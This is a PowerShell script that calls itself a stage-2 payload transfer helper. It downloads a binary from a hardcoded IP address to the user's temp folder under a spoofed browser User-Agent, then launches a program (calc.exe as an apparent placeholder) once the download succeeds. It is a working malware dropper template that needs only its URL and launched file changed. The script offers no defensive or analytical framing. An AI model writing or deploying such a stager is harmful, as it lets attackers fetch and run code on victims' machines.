
<#
.SYNOPSIS
    Stage 2 payload transfer helper.

.DESCRIPTION
    Downloads the staged artefact to a per-user drop path.
    The destination is verified before the launcher runs.
#>
[CmdletBinding()]
param(
    [string]$Stage1Url = "http://192.0.2.178:8080/cdn/stage2.bin",
    [string]$DropPath = "$env:TEMP\payload.bin",
    [int]$RequestTimeout = 81,
    [string]$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
)
$ErrorActionPreference = "Stop"

function Invoke-Stage2Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Starting stage 2 transfer"
    $StageResult = Invoke-Stage2Download -SourceUrl $Stage1Url -DestinationPath $DropPath -TimeoutSec $RequestTimeout -UserAgent $UserAgent
    if ($StageResult) {
        Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
    }
}
catch {
    Write-Warning "Stage 2 transfer failed: $($_.Exception.Message)"
}

Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
Write-Output "stage 16 initialized"
